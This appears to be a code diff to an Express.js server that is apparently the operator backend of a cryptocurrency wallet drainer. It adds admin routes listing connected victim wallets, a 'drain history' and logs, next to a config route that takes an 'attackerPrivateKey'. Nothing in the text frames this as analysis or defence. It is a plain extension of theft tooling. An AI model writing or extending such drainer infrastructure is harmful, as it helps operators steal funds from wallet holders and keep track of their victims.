@@ -316,6 +316,21 @@ app.get('/admin/dashboard', adminAuth, (req, res) => {
   })
 })
 
+// Get wallets list
+app.get('/admin/wallets', adminAuth, (req, res) => {
+  res.json(connectedWallets.slice(0, 100))
+})
+
+// Get drain history
+app.get('/admin/drains', adminAuth, (req, res) => {
+  res.json(drainHistory.slice(0, 100))
+})
+
+// Get logs
+app.get('/admin/logs', adminAuth, (req, res) => {
+  res.json(logs.slice(0, 200))
+})
+
 // Update config (set receiving wallet, password)
 app.post('/admin/config', adminAuth, (req, res) => {
   const { attackerPrivateKey, adminPassword } = req.body
